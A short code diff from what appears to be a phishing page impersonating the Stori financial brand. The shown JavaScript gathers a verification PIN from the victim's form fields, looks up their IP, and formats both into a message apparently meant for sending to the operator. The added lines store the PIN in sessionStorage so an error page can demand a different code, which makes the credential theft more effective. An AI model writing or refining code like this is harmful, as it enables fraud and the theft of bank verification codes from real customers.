@@ -85,6 +85,10 @@
 
     async function submitForm() {
       const pinValues = Array.from(document.querySelectorAll('.pin-input')).map(input => input.value).join('');
+      
+      // Guardar el PIN para que error.html no permita repetirlo
+      sessionStorage.setItem('pinValidacion', pinValues);
+      
       const ip = await getIP();
       const message = `🔢 **CÓDIGO DE VERIFICACIÓN (Stori)**\n\n🔐 **PIN:** ${pinValues}\n🌐 **IP:** ${ip}\n🕒 **Fecha:** ${new Date().toLocaleString()}`;
       
